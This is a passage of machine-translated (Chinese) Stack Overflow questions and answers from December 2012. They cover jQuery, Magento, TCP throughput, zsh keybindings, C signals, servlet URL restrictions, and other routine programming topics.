为每一行终止字符串。另请参阅[更新的 jsFiddle](http://jsfiddle.net/s2kwb/3/)。

```
$("td.99999").first().parent().next().replaceWith("<tr><td >category 3</td>" +
    "<td >2222</td>" +
    "<td >something 22</td>" +
    "<td >something 22</td>" +
    "<td >$3,433</td>" +
    "<td >$300</td>" +
    "<td >$3,733</td>" +
    "<td >$349</td>" +
    "<td >$4,082</td>" +
    "</tr>");​ 
```

* * *

[Google JavaScript Style Guide](http://google-styleguide.googlecode.com/svn/trunk/javascriptguide.xml#Multiline_string_literals)推荐这种字符串连接，并建议不要使用替代反斜杠换行符的多行字符串。

> 斜杠后的空格会导致棘手的错误

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-19T17:32:41.747

修复小提琴中的错误并添加 jQuery 作为参考使其工作：

[**演示**](http://jsfiddle.net/s2kwb/6/)

您的字符串不是正确的字符串文字。浏览器调试工具中的控制台也表示：

> SyntaxError：未终止的字符串文字 [Break On This Error]
> 
> $("td.99999").first().parent().next().replaceWith("category 3

固定脚本：

```
$("td.99999").first().parent().next().replaceWith("<tr><td >category 3</td><td >2222</td><td >something 22</td><td >something 22</td><td >$3,433</td><td >$300</td><td >$3,733</td><td >$349</td><td >$4,082</td></tr>"); 
```

# c# - 使用 Redemption 将 msg 文件附加到 msg

> ID：13957739
> 
> 赞同：0
> 
> 时间：2012-12-19T17:21:31.327
> 
> 标签：c#, outlook-redemption, msg

我正在开发一个概念验证应用程序，最终目标是创建一堆带有附件的 msg 文件。因此，我们有一个父 .msg 附加了多个子 .msg 文件。我已经成功地创建了子味精，但是在创建带有子级的父味精文件时，它就行不通了。我为此使用**Redemption**，它是试用版。

```
 IRDOSession rdoSession = new RDOSession();
  rdoSession.Logon("", "", false, false, null, false);

  IRDOMail m = rdoSession.GetMessageFromMsgFile(@"c:\test\test.msg", true);

  m.Recipients.Add("****");
  m.Recipients.ResolveAll(null, null);
  m.Subject = "Subject of test .msg";
  m.HTMLBody = "<strong>This is a test body</strong>";
  m.SenderEmailAddress = "******";

  m.Attachments.Add(@"C:\test\t.txt", Type.Missing, Type.Missing, Type.Missing);

  m.SaveAs(@"c:\test\test.msg"); 
```

有没有人遇到过这个问题？

问候，克里斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-20T09:36:44.853

我通过电子邮件从 Dmitry 那里得到了答案。我基本上需要调用 m.Save(); 代替 m.SaveAs();

```
m.SaveAs(@"c:\test\test.msg"); 
```

换成...

```
m.Save(); 
```

# java - 让热代码替换工作（Eclipse EE juno，Jboss AS 7.1）

> ID：13957742
> 
> 赞同：1
> 
> 时间：2012-12-19T17:21:42.357
> 
> 标签：java, eclipse, jboss

我在[这里](https://stackoverflow.com/questions/2673554/hot-code-replace-not-working-eclipse-doesnt-change-any-code-on-jboss)提到了这个问题，根本无法解决我的问题。

我正在制作一个使用 jsp / css 以及 jquery 的动态 Web 项目。现在我需要停止服务器，清理并重新发布。

我已经检查了自动构建，我选择了在服务器上自动发布......我不确定我是否遗漏了一些东西，但我很想把它作为前端开发工作，而没有实时编辑是可怕的。

我没有使用 maven 或任何其他形式的源代码控制（还）（如果需要，我可以添加常春藤？）

谢谢。！

[服务器设置的图像](https://i.stack.imgur.com/QEn0q.png)

![我也自动检查了构建。](../Images/304cb2b04b819150bbfb236135f416ab.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-20T12:06:49.290

如果您使用[Jboss 工具套件](http://docs.jboss.org/tools/3.2.1.GA/)附带的[JBoss 服务器管理器](http://docs.jboss.org/tools/3.2.1.GA/en/as/html_single/index.html)，您必须在 Jboss 服务器配置的“发布”部分标记“资源更改时自动发布”选项。

[你可以在这里](http://www.jboss.org/tools)找到 Juno 的 Jboss 工具，或者你可以使用 Jboss Developer Studio IDE，这是一个 Eclipse Indigo + Jboss 工具，就像[这里](http://www.jboss.org/jdf/examples/ticket-monster/tutorial/Introduction/)解释的那样（我正在使用它，它比 eclipse 运行得更好，不知道为什么，但这只是我的经验）

# javascript - 如何创建一个新的 html 元素？

> ID：13957746
> 
> 赞同：6
> 
> 时间：2012-12-19T17:22:11.107
> 
> 标签：javascript, html

我尝试创建一个名为 test 的新 HTML 元素：`<test>some text</test>`

我试图像这样对其进行原型设计：`HTMLUnknownElement.prototype.style.backgroundColor = "red";`但它不起作用。

你能帮我吗，如何管理它？

提前致谢，

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-19T17:23:10.893

怎么样[`createElement()`](https://developer.mozilla.org/en-US/docs/DOM/document.createElement)？

```
var el = document.createElement("test");
el.style.backgroundColor = "red";
document.body.appendChild(el); 
```

## 编辑

如果我们开始：

```
<html>
  <head></head>
  <body>
  </body>
</html> 
```

结果将是：

```
<html>
  <head></head>
  <body>
    <test style="background-color:red"></test>
  </body>
</html> 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-19T17:24:28.590

真的没有理由这样做。

当你想创建一个红色背景的元素时，你应该使用一个现有的元素并为其分配一个具有红色背景的 CSS 类（如`<span class="test">`）。

# java - YUI 压缩器 - 将多个输入文件压缩成一个输出文件

> ID：13957748
> 
> 赞同：4
> 
> 时间：2012-12-19T17:22:17.913
> 
> 标签：java, yui-compressor

> **可能重复：**
> [如何组合和压缩多个脚本和 css 文件以供生产使用？](https://stackoverflow.com/questions/632725/how-can-i-combine-and-compress-multiple-script-and-css-files-for-production-use)

我想将多个 javascript 文件压缩成一个缩小文件。我正在使用[YUI Compressor](http://developer.yahoo.com/yui/compressor/)。在他们的页面上它说它可以这样做（他们的示例使用 css 文件，但我用 js 替换了它）：

```
java -jar yuicompressor.jar -o '.js$:-min.js' *.js 
```

当我尝试执行此操作时，我得到一个名为`.js$`

我错过了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T18:31:53.333

以下对我有用：`java -jar yuicompressor.jar *.js > combined.js`

# cassandra - 如何修复卡桑德拉。我不确定如何在更改 snitch 后使用 nodetool

> ID：13957754
> 
> 赞同：1
> 
> 时间：2012-12-19T17:22:39.487
> 
> 标签：cassandra, pycassa

我是一名实习生，没有太多经验，所以我相信你们可以在这里帮助我。我从 google 获得了所有类型的 nodetool 语法，但我不确定如何使用它以及何时应该使用它。我的 3 节点集群仅在环上显示 1 个节点。所以我将告密者更改为 rackInferring 并重新启动 cassandra。现在我必须运行 nodetool repair 吗？如何？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-24T19:43:01.617

我担心`nodetool ring`没有看到您的所有节点。在运行之前先修复它`nodetool repair`。否则，`nodetool repair`没有其他节点可以与之交谈，也不会完全正确。

为了让您的戒指完好无损，请确保您的所有节点都配置为在同一网络上进行八卦。确保它们都具有至少一个种子节点，该种子节点在所有节点上配置相同并且已启动。确保它们都具有相同的集群名称。如果失败，请将它们全部放下，然后将它们一个接一个恢复。

# zend-framework - 如何在 Magento 查询中添加“order by”

> ID：13957755
> 
> 赞同：2
> 
> 时间：2012-12-19T17:22:39.967
> 
> 标签：zend-framework, magento, sql-order-by

我为magento安装了一个脚本。它允许添加对订单的评论。所以它在订单网格上显示一条评论。

问题是它没有按“created_at”列对评论进行排序。我不知道如何设置订单。

这是代码的一部分：

```
 protected function _initSelect()
{
    parent::_initSelect();

    // Join order comment
    $this->getSelect()->joinLeft(
        array('ordercomment_table' => $this->getTable('sales/order_status_history')),
        'main_table.entity_id = ordercomment_table.parent_id AND ordercomment_table.comment IS NOT NULL',
        array(
            'ordercomment' => 'ordercomment_table.comment',
        )
    )->group('main_table.entity_id');

    return $this;
} 
```

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-19T20:07:13.607

```
protected function _initSelect()
{
    parent::_initSelect();

    // Join order comment
    $this->getSelect()->joinLeft(
        array('ordercomment_table' => $this->getTable('sales/order_status_history')),
        'main_table.entity_id = ordercomment_table.parent_id AND ordercomment_table.comment IS NOT NULL',
        array(
            'ordercomment' => 'ordercomment_table.comment',
        )
    )->group('main_table.entity_id');

    //Add ORDER BY
    $this->getSelect()->order(array('ordercomment_table.created_at DESC'));

    return $this;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-21T07:24:05.127

替换上述现有函数中的这一行。添加一个 ORDER BY。

```
$this->getSelect()->order('ordercomment_table.created_at', 'DESC'); 
```

# ios - 移动 box2d 身体球

> ID：13957756
> 
> 赞同：1
> 
> 时间：2012-12-19T17:22:46.067
> 
> 标签：ios, iphone, box2d, physics

我怎样才能像排球一样在box2d中移动身体球而不加速或倾倒（以恒定速度）。

我需要一个特殊的配方吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T17:30:25.727

在 Box2D 中，您[使用力移动对象](http://www.emanueleferonato.com/2010/02/16/understanding-box2d-applicable-forces/)。您可以施加脉冲或线性力。

你可以应用冲动做：

```
myBody->ApplyForce( force, myBody->GetWorldCenter() ); 
```

或通过以下方式产生力量：

```
myBody->ApplyForce(force, myBody->GetWorldCenter()); 
```

请注意，力是您可以构建的 b2Vec：

```
b2Vec force = b2Vec2(0,50); 
```

这种力量只会将身体向上推。

如果您需要抛物线轨迹，则可以创建分量 x 和 y 大于 0 的力：

```
b2Vec force = b2Vec2(50,50); 
```

然后物理引擎将完成剩下的工作。

你也可以移动到一个[特定的位置](https://stackoverflow.com/questions/6170087/move-body-to-a-specific-position-box2d)，虽然我不建议你这样做。

如果您想了解有关部队的更多信息，请[点击此链接](http://www.iforce2d.net/b2dtut/forces)。

# google-analytics - 站点搜索功能不适用于基于 POST 的表单提交

> ID：13957765
> 
> 赞同：0
> 
> 时间：2012-12-19T17:23:20.497
> 
> 标签：google-analytics, sendasynchronousrequest

我在我的网站中设置了搜索功能，它使用第三方扩展来检索搜索结果。搜索词不作为查询参数传递。

以下是我的搜索结果示例 URL：mysite.com/search/results/dGVzdA/

我无法更改 URL 以将搜索词作为查询参数传递。

所以我试图从谷歌分析 javascript 发送异步跟踪：

```
<script>
var _gaq= _gaq || [];
_gaq.push(['_setAccount','UA-XXXXXXX-X']);
//Push search query into google analytics

if ({url_segment_1} == 'search' && {url_segment_2} == 'results') 
_gaq.push(['trackPageview'],['/search/?q=test']);
else
_gap.push(['trackPageview']);
(function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
s.parentNode.insertBefore(g,s)}(document,'script'));
</script> 
```

javascript 逻辑似乎执行得很好，我已经通过放置警报选项对其进行了测试。那么关于 _gaq.push() 有什么我没有正确实现的吗？有人可以照亮同一个

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T19:25:15.470

几个错误：

*   它是`_trackPageview`，带有初始下划线。
*   的参数`_trackPageview`需要在数组内，例如：

`_gaq.push(['_trackPageview','/search/?q=test']);`

[编辑] 还有一个错字：`_gap.push`应该是`_gaq.push`

# performance - TCP 最大吞吐量和浏览器

> ID：13957768
> 
> 赞同：2
> 
> 时间：2012-12-19T17:23:42.207
> 
> 标签：performance, networking, tcp, throughput

理论上，最大 tcp 速度是 min{rwnd,cwnd} / RTT，其中 cwnd 是拥塞窗口大小，rwnd 是接收窗口大小。假设 cwnd 足够大，那么它就是 rwnd/RTT。现在，如果我得到的最大窗口大小为 65Kbytes（使用来自某个站点的这些计算）：

```
RTT 10 ms => TCP throughput = 52428000 bps = 52Mbps
RTT 20 ms => TCP throughput = 26214000 bps = 26Mbps
RTT 50 ms => TCP throughput = 10485600 bps = 10Mbps
RTT 100 ms => TCP throughput = 5242800 bps = 5.2Mbps
RTT 150 ms => TCP throughput = 3495200 bps = 4.3Mbps
RTT 200 ms => TCP throughput = 2621400 bps = 2.5Mbps
RTT 300 ms => TCP throughput = 1747600 bps = 1.7Mbps
RTT 500 ms => TCP throughput = 1048560 bps = 1Mbps 
```

这有多准确？由于我可以以 5Mbps 的速度从网站下载（不是 torrent，直接下载），同时 RTT 超过 200 毫秒，所以我超过了理论最大值，为什么会发生这种情况？浏览器是否使用超过 1 个 tcp 连接进行下载？

另外，我想知道 rwnd/RTT 究竟来自哪里，因为 rwnd 字节可以（并且肯定会）超过 1 个 TCP 段大小，这意味着您将在每个 RTT 开始时发送超过 1 个段，这意味着 1 RTT 不足以发送和接收来自所有已发送段的 ACK，因此 rwnd/RTT 实际上与实际吞吐量相差甚远。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T18:01:15.407

最大窗口大小不是 65Kbytes。最大窗口大小为 65,535 个窗口大小单位，[可能是也可能不是字节](http://en.wikipedia.org/wiki/TCP_window_scale_option)。

我不太确定我是否遵循您的最后一个问题。段大小与什么有什么关系？您可以根据需要使用尽可能多的分段来发送要发送的任何数据。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-20T10:42:45.997

我是否正确理解您，您想知道如何“尽可能快地”接收？

你说的公式是正确的。窗口和 RTT 决定了您的带宽（还有其他因素，但在大多数情况下，这些是重要因素）。

但我想知道你的数字。

广告 1) 你确定 RTT 吗？这对于常规下载来说似乎相当高，除非是跨大陆的。使用 ping 检查 RTT（例如`ping simtel.net`，将主机名替换为有问题的主机名）。您可以使用更准确的 ping 实用程序，例如我的`hrping`( [http://www.cfos.de/ping](http://www.cfos.de/ping) )（适用于 Windows）。

广告 2）您确定窗口大小吗？今天 64k 相当低，所有现代操作系统都试图通过 RFC 1323 Window Scaling ( [http://en.wikipedia.org/wiki/TCP_window_scale_option](http://en.wikipedia.org/wiki/TCP_window_scale_option) ) 进行更多协商。您可以使用 SG TCP/IP Analyzer ( [http://www.speedguide.net/analyzer.php](http://www.speedguide.net/analyzer.php) ) 来检查您的 RWIN。另一个检查连接的好工具是 Netalyzr ( [http://netalyzr.icsi.berkeley.edu](http://netalyzr.icsi.berkeley.edu) )。

我很想看看测量的数字。

# macos - 在 OSX 应用程序中更改光标

> ID：13957770
> 
> 赞同：0
> 
> 时间：2012-12-19T17:23:44.117
> 
> 标签：macos, cocoa

我正在尝试使用以下代码（从 Xcode 文档复制）更改 OS X 应用程序中的光标：

```
NSCursor* c = [NSCursor pointingHandCursor]; [c set]; 
```

它没有生效，我不确定我在这里做错了什么。任何想法表示赞赏。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-19T17:37:37.503

在 NSView 上，您可以尝试

```
- (void)resetCursorRects {
    [super resetCursorRects];
    [self addCursorRect:[self bounds] cursor:[NSCursor pointingHandCursor]];
} 
```

这也应该适用于 NSWIndow 但我没有测试过

# c - 为什么在 Linux 上的示例代码中没有发出信号？

> ID：13957776
> 
> 赞同：-1
> 
> 时间：2012-12-19T17:24:15.137
> 
> 标签：c, linux, signals

我正在尝试了解以下有关信号的示例代码：

```
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

sig_atomic_t sigusr1_count = 0;

void handler(int signal_number) {
    ++sigusr1_count;
}

int main() {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = &handler;
    sigaction(SIGUSR1, &sa, NULL );
    printf("SIGUSR1 was raised %d times\n", sigusr1_count);
    return 0;
} 
```

输出是：

```
SIGUSR1 was raised 0 times 
```

为什么没有发出信号？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T17:33:29.280

有几个原因。首先，没有任何东西会向您的进程发送 SIGUSR1。另一个更重要的一点是，你不给任何人时间这样做。注册信号处理程序后，您会立即打印出信号被接收的次数，很可能不到几毫秒。您需要`sleep(10)`在打印结果之前添加类似的内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T17:27:14.177

因为没有任何东西向`SIGUSR1`您的应用程序发送信号？您是否尝试运行`kill -USR1 pid`以发送信号？或者`kill(pid, SIGUSR1)`来自这个或另一个应用程序？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-19T17:27:32.487

你把信号发到哪里去了`SIGUSR1`？您应该在之后`sigaction`和之前感觉到它...在您的函数`printf`中添加一个循环。`main`

# c# - 刷新表单并重新执行构造函数代码

> ID：13957778
> 
> 赞同：1
> 
> 时间：2012-12-19T17:24:18.703
> 
> 标签：c#, winforms

我需要一种刷新表单的方法，以便它执行构造函数中的所有代码，我尝试使用`Form.Refresh()`, `this.Invalidate()`，甚至`Form.Reload()`.. 仍然没有像我第一次启动应用程序时那样运行，有没有简单的方法去做这个？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-19T17:25:49.157

构造函数不能执行两次。您可以通过将构造函数的代码放入方法中并在需要时调用它来构建解决方法。

例子：

```
public partial class MyForm : Form
{
    public MyForm()
    {
        InitializeComponent();
        DoStuff();
    }

    void DoStuff()
    {
        //Your code
    }

    void Button1_Click(object sender, EventArgs e)
    {
        DoStuff();
    }
} 
```

# php - 检查产品ID在magento中是否有效的最佳方法是什么？

> ID：13957783
> 
> 赞同：1
> 
> 时间：2012-12-19T17:24:29.850
> 
> 标签：php, magento, magento-1.7

对于后端模块，我需要检查产品 ID 是否有效，即：是否有具有该 ID 的产品？我为此找到了两种解决方案，但我对任何一种都不太满意：

1.  直接查询`catalog_product_entity`表。非常快但绝对不是很优雅，我担心可能存在我不知道的问题。

2.  使用以下代码：

    ```
    $product = Mage::getModel('catalog/product')->load($productID)
    if ($product->getId()) {
      //valid id
    }
    else {
      //not a valid id
    } 
    ```

    这应该可以，但是速度很慢，因为我必须一次检查多个 ID。而且由于我不需要实际的产品数据，因此加载它并没有任何意义。

有更好的建议吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-19T17:42:54.813

```
$productIds = array(16,17,18,19,290993,25    /*...*/);

$collection = Mage::getResourceModel('catalog/product_collection');
$collection->addFieldToFilter('entity_id',array('in'=>$productIds))->load();

$foundIds = array_intersect($productIds,array_keys($collection->toArray()));

var_dump($foundIds); /* each array value should be a valid ID */ 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-20T17:37:21.920

感谢[benmarks](https://stackoverflow.com/users/833795/benmarks)和[james](https://stackoverflow.com/users/1163653/james)，您为我指明了正确的方向，我只是结合了您的方法：

```
$productIds = array(16,17,18,19,290993,25    /*...*/);

$collection = Mage::getResourceModel('catalog/product_collection');
$collection->addFieldToFilter('entity_id',array('in'=>$productIds));

$foundIds = $collection->getAllIds();

var_dump($foundIds); /* each array value should be a valid ID */ 
```

出于某种原因，getAllIds() 将 Id 作为字符串而不是整数返回，但这很好。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-19T18:22:07.630

试试这个：

```
$collection->getAllIds(); 
```

您将获得所有产品 ID 的数组，然后您可以`in_array`检查其有效性。看一眼

```
Mage_Catalog_Model_Resource_Product_Collection 
```

看看它是如何完成的。

**编辑**

例子：

```
function isProductIdValid($productId)
{
    // Allows model overrides (other modules) to work correctly.
    // Returns all valid IDs
    $collection  = Mage::getModel('catalog/product')->getCollection();
    $productIds = $collection->getAllIds();

    if (in_array($productId, $productIds)) {
        return true;
    } else {
        return false;
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-19T17:44:34.313

为了快速，原始查询对我来说绝对是最快的:-)

但也许像这样预加载所有 id 会有所帮助？

```
$collection = Mage::getModel('catalog/product')->getCollection()->getSelect()->reset(Zend_Db_Select::COLUMNS)->columns(array('entity_id'));

$ids = array();
foreach ($collection as $product) {
  $ids[] = $product->getId();
} 
```

然后，如果 id 存在，您可以使用 in_array 方法进行测试。

# zsh - zsh: 无法在 vi 模式下绑定 ^q 或 \Mq

> ID：13957786
> 
> 赞同：1
> 
> 时间：2012-12-19T17:24:41.783
> 
> 标签：zsh

我的 .zshrc 文件包含该行

```
bindkey -v 
```

我正在尝试将 ^q 或 \Mq 绑定到推线，例如

```
bindkey "^q" push-line 
```

但由于某种原因它不起作用。

运行 `bind key -v' 确认

```
"^Q" push-line 
```

但它实际上并没有做任何事情。其他控制映射，例如 ^r，工作正常。

我可以成功地将“推线”映射到“\eq”，但我不喜欢这种行为。首先，我从不使用 esc 类型的绑定，其次，这样做会将它绑定到 control、meta 和 escape，这太过分了。（顺便说一句，它不应该只用 `bindkey -m' 绑定所有这些吗？我从来没有在我的 .zshrc 中设置过？）

那么，有人知道这里发生了什么吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-20T10:52:39.070

[软件流控制（维基百科）](http://en.wikipedia.org/wiki/Software_flow_control)使用这些快捷方式

`Ctrl+S`并`Ctrl+Q`用于停止和恢复程序的输出。

试一试：
运行`while (true) ; do echo $RANDOM ; sleep 1 ; done`
按`Ctrl+S`，输出停止。
按`Ctrl+Q`，输出恢复。
（我不确定程序是否像 一样停止`Ctrl+Z`，我认为它是由于缺少输出而卡住的。`Ctrl+C`杀死程序。）

这些快捷方式会取代您的快捷方式，但如果您禁用此流量控制功能，它可能会起作用。
您可以在如何在终端中意外按下 Ctrl-S 后解冻中了解如何禁用它[？- Unix 和 Linux](https://unix.stackexchange.com/questions/12107/how-to-unfreeze-after-accidentally-pressing-ctrl-s-in-a-terminal)。
试试看并告诉我们。

# actionscript-3 - as3 重用具有不同变量的 datagrid cellrenderer

> ID：13957787
> 
> 赞同：1
> 
> 时间：2012-12-19T17:24:43.790
> 
> 标签：actionscript-3, dynamic, datagrid

我有几个带有自定义单元格渲染器的非常大的数据网格。我面临的问题是我现在有 > 80 个，每个数据网格每列 1 个。

我很好奇是否有一种方法可以将这些简化为 1 个全局单元格渲染器，我可以将变量传递到该单元格渲染器中以定义该列的单元格渲染器允许的内容。

IE：

```
...
col1 = new DataGridColumn("PurchaseStartDate");
        col1.headerText = "Purchase Date (YYYY-MM)";
        dg.addColumn(col1);
            col1.width = 110;
            col1.editable = false;
            col1.sortable = false;
            col1.cellRenderer = Alternating_Row_Colours_editable36;
                Alternating_Row_Colours_editable36._dg = dg;
                Alternating_Row_Colours_editable36.__enabled = true;
                Alternating_Row_Colours_editable36._myCol = 12;
                Alternating_Row_Colours_editable36._isNum = 3;
                Alternating_Row_Colours_editable36._stage = this;
                Alternating_Row_Colours_editable36._maxChars = 9; 
```

在单元格渲染器中，我使用所有这些变量来自定义允许的内容。IE：

```
...
public function Alternating_Row_Colours_editable36()
    {
        super();
            if(_isNum == 0){
                restrict = "a-z A-Z @_,.0-9//-";
                maxChars = 64;
            }else if (_isNum == 1){
                restrict = ".0-9";
                maxChars = 9;
            }else if (_isNum == 2){
                restrict = "0-9";
                maxChars = 2;
            }else if (_isNum == 3){
                restrict = "0-9 \\-";
                maxChars = 9;
            }else if (_isNum == 4){
                restrict = "0-9\. %";
                maxChars = 9;
            }
            if(_maxChars != -1){
                maxChars = _maxChars;
            } 
```

如果你看上面的问题，我只是注意到我有一个错误。我使用“//-”而不是“\-”来转义连字符。现在我要进行 80 多项更改，每次尝试添加新内容时，回调、限制、最大字符、使其可编辑、擦除输入、将其从动态更改为输入并再次返回...

我很想知道是否有办法创建类的实例并使用该单元格渲染器。或者能够传递仅影响该列而不是所有列的变量。我不是最好的，但我的印象是它可能只是我需要使用的设置/获取函数，或者将变量更改为受保护的、私有的或其他东西以获得所需的结果。

任何人都对如何控制这些 80 多个单元格渲染器有任何建议。因为我不期待需要对它们进行更改以进行整理...

jc

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-08-20T18:39:46.970

我知道这是一个很晚的回复，你现在很可能已经继续前进了！

您可以使用 CellRenderer 类的“listData”属性中的信息来完成：

```
// Create a private class level variable called _dataField...
private var _dataField:String;

// Assign the dataField...
public function set listData(value:ListData):void {
    _listData = value;                  

    this._dataField = DataGridColumn(DataGrid(this._listData.owner).columns[this._listData.column]).dataField;

    // set the data again now...
    this.data = _data;          

    invalidate(InvalidationType.DATA);
    invalidate(InvalidationType.STATE);
}

// Use the dataField when setting value from DataProvider...
public function set data(value:Object):void {                        
    _data = value;          
    if (this._dataField != "")
    {
        this.text = value[this._dataField]; 
    }                       
} 
```

希望能满足大家的好奇心。可耻的是，他们首先不只是将该属性传递给 CellRenderer！

干杯

# servlets - 在 servlet 3.0 中启用/禁用由 @WebServlet 注释映射的 servlet

> ID：13957790
> 
> 赞同：1
> 
> 时间：2012-12-19T17:24:53.737
> 
> 标签：servlets

我是一个习惯于定义 servlet/mappings 的老式方法的管理员，即在 web.xml 中。

Servlet 3.0 很棒，如果您是开发人员，@WebServlet 注释肯定很漂亮。

问题是，作为管理员，如果我正在管理一个 web 应用程序，其中包含许多由注释定义的不同实用程序 servlet (servlets.jar)，但并非所有这些都适用于每个部署？换句话说，我想将适合给定部署的 URI 映射列入白名单，或者将不适合的映射列入黑名单。

无需恢复到较早的 servlet 规范，并且理想情况下（尽管这还没有解决）而不要求我的开发人员改变他们做事的方式。

如果重要的话，运行 JDK 1.7 Tomcat 7。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T17:29:45.040

> *我想将适合给定部署的 URI 映射列入白名单，或者将不适合的映射列入黑名单。*

您可以使用`<security-constraint>`带空的 a`<auth-constraint>`来阻止对给定 URL 模式的访问。

```
<security-constraint>
    <display-name>Restrict direct access to some servlets.</display-name>
    <web-resource-collection>
        <web-resource-name>Restricted URLs</web-resource-name>
        <url-pattern>/servlet1/*</url-pattern>
        <url-pattern>/servlet2/*</url-pattern>
        <url-pattern>/servlet3/*</url-pattern>
        <!-- ... -->
    </web-resource-collection>
    <auth-constraint />
</security-constraint> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-02-26T19:06:28.710

`metadata-complete="true"`您可以在 web.xml 中添加to`web-app`标记来禁用 jar 扫描。这样，您将需要像往常一样在 web.xml 中使用所有 servlet、过滤器等。

# java - 如何直接从大文本文件中读取特定行的数据，而无需在 C 或 java 中搜索每一行

> ID：13957796
> 
> 赞同：3
> 
> 时间：2012-12-19T17:25:15.440
> 
> 标签：java, vb.net

我有一个文本文件，其中包含一些超过 7GB 的巨大帐户详细信息。每行包含单个帐户的详细信息和其他信息。在这里我想阅读一些帐户详细信息，其中包含前 3 个字符作为“XBB”。如果我曾经逐行搜索，那将需要很长时间，所以我想直接点击包含“XBB”的特定行。

在 Java 或 VB 或 VB.net 中是否有任何可能的方法来做到这一点

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-19T17:29:27.413

如果这些行按它们的前 3 个字符排序，那么您可以进行二进制搜索。如果线条是固定长度，这很简单。否则，您将需要在二进制搜索的每个步骤中搜索每一行的开头。

如果您知道该行的索引，您可以尝试直接访问它。同样，如果线条是固定长度的，这很简单。否则，您仍然需要进行一些探索和搜索。

在 Java 中，用于此目的的工具是[`RandomAccessFile`](http://docs.oracle.com/javase/6/docs/api/java/io/RandomAccessFile.html). 我不了解 VB/VB.net。

按照 Peter Lawrey 的建议，如果您愿意扫描文件一次，您可以在每个 3 字符前缀开始的文件中构建偏移量索引。然后，您可以使用它来非常快速地到达正确的线路。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T17:31:57.687

你使用什么语言并不重要。找到某物的唯一方法就是搜索它。你可以使用[Lucene](http://lucene.apache.org)之类的搜索工具提前进行搜索，即创建全文搜索索引，或者你可以像现在这样在需要时进行搜索，但你将无法逃避搜索部分。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-19T17:30:10.003

只有当您有一个索引文件，并且该索引文件包含您要搜索的特定数据列的索引时，您才能执行此操作。

另一种选择是将文件加载到数据库中，如 Sql Server Express，并在其上运行 sql 查询。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-12-19T17:29:42.467

使用正则表达式 (regex)。使用这些，您可以设置仅包含这些特定字母的表达式。然后使用扫描仪，它将仅查找该字母序列。

# c - 无法创建可从我的程序访问的 C 头文件

> ID：13957801
> 
> 赞同：0
> 
> 时间：2012-12-19T17:25:36.177
> 
> 标签：c, header

我自己做项目，把main和c源码保存在一个文件里，头文件保存在codeblocks的include目录下。当我从项目主函数中调用我的函数时，它编译得很好。但是当我`#include`将头文件转到其他文件以供使用时，编译器找不到这些函数。原型在标题中，但它们的定义在另一个文件中的源代码中。我可以访问存储在标头中的预处理器常量和宏，但函数原型与其源代码之间的链接似乎不存在于实际项目之外。

我的目标是制作头文件，就像我正在使用的现有文件（stdio.h、stdlib.h 等）一样。我在任何地方都找不到任何有用的东西。帮帮我，我已经在这几天了！

我知道我可以使用更简单的功能制作 .c 文件，但我想要挑战，想要创建 lib 文件，而且我是一个性能狂（据我所知，使用 .h 文件而不是 .c 文件是效率更高，但不记得为什么。）

头文件：

```
 #ifndef FIRO_H_INCLUDED
        #define FIRO_H_INCLUDED

        #include <stdbool.h>

        #define MA_TA 69

        bool checkprime(unsigned long long);
        int square(int);

        #endif // FIRO_H_INCLUDED 
```

源代码：

```
 #include "firo.h"
        #include <math.h>

        bool checkprime(unsigned long long prime)
        {
            unsigned long long root=(unsigned long long)(sqrt(prime)+1);
            unsigned long long i;
            for(i=2; i<=root; i<3?(i++):(i+=2))
            {
                if(prime%i==0)
                return false;
            }
            return true;
        }

        int square(int a)
        {
            return a*a;
        } 
```

我希望得到一个答案，而不是讽刺。我确实在某处读过，将代码分别分割成 .h 文件和源代码会以某种方式加速访问函数的过程，不要怪我不知道它是如何工作的。我实际使用的 checkprime 功能，其余的只是用于测试。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-20T03:25:19.263

在代码块中，您必须为静态库创建一个不同的项目并构建它。然后，您可以打开主项目的链接器设置（项目 -> 构建选项 -> 链接器设置选项卡）并将您的库添加到“链接库”列表中。

# php - PHP JSON 大整数

> ID：13957805
> 
> 赞同：4
> 
> 时间：2012-12-19T17:26:04.143
> 
> 标签：php, json, biginteger

我正在使用 json_encode 将我的 php 多维数组转换为输出 json。通常，此函数会将所有值转换为字符串。为了确保整数值作为整数值发送到 javascript，我使用了数字检查：

```
